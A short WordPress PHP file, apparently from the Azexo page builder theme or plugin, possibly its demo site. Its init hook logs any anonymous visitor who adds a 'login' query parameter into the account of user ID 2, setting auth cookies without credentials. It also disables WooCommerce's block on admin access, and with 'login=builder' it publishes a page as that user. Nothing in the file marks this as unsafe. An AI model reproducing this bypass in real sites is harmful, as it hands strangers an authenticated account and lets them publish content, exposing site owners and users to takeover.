<?php


add_filter('woocommerce_prevent_admin_access', 'azexo_prevent_admin_access', 10, 1);
 
function azexo_prevent_admin_access($prevent_admin_access) {
    return false;
}


add_action('init', 'azexo_init');

function azexo_init() {
    if (!is_user_logged_in() && isset($_GET['login'])) {
        $user_data = get_userdata(2);
        wp_set_current_user(2, $user_data->user_login);
        wp_clear_auth_cookie();
        wp_set_auth_cookie(2, true);
        do_action('wp_login', $user_data->user_login, $user_data);
    }
    if (isset($_GET['login']) && $_GET['login'] == 'builder') {
        $post_id = wp_insert_post(array(
            'post_title' => '',
            'post_type' => 'page',
            'post_status' => 'publish',
            'post_author' => get_current_user_id(),
            'post_content' => '<div data-section="empty rows/1 column.html"><div data-full-width="false[[full-width]]" data-stretch-content="false[[stretch-content]]" data-column-padding="15" data-background-mode="none" data-transparency="0%[[transparency]]" style="background-color: transparent[[background-color]]; background-image: url(\'/\'); padding-top: 0px[[padding-top]]; padding-bottom: 0px[[padding-bottom]];" data-parallax="false[[parallax]]" data-parallax-speed="40[[parallax-speed]]"><div class="azen-row"><div class="azen-col-xs-12 azen-col-sm-12 azen-col-md-12 azen-col-lg-12 azen-col-xs-offset-0 azen-col-sm-offset-0 azen-col-md-offset-0 azen-col-lg-offset-0 az-elements-list" data-cloneable=""><div data-element=" "></div></div></div></div></div>',
                ), true);
        if (!is_wp_error($post_id)) {
            add_post_meta($post_id, 'azh', 'azh', true);
            //add_post_meta($post_id, '_wp_page_template', 'azexo-html-template.php', true);
            exit(wp_redirect(add_query_arg('azh', 'customize', get_permalink($post_id))));
        }
    }
}
